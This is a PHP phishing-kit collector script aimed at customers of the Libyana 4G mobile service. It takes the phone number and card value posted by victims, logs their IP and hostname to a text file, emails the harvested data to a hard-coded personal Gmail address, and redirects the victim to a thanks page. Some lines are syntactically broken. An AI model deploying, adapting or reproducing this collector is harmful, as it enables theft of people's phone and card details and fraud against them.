<?php
$ip = getenv("REMOTE_ADDR");
$text_result .= "|-------------- Card Libyana 4G --------------|\n";
$text_result .= "Phone                  : ".$_POST['phone']."\n";
$text_result .= "Card               : ".$_POST['card']."\n";
$text_result .= "IP                     : $ip\n";
$text_result .= "|-------------- Card Libyana 4G --------------|\n";
$file = fopen("MohaZzXx.txt", 'a');
fwrite($file, $text_result);
$text_result .= "HOST                   : 
".gethostbyaddr($ip)."\n";
$text_result .= "BROWSER                : 
".
$text_result .= "|-------------- Card Libyana 4G Login --------------|\n";
$subject = "=?UTF-8?Q?=e2=9d=a4_?= Card Libyana $ip =?UTF-8?Q?=e2=9d=a4_?=";
//Put Your Email Here!!!!!!!!!!!!!!!!
$send = "Ah.so.7955@gmail.com";
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail($send,$subject,$text_result,$headers);
header("Location:Thanks.php".$to."");
?>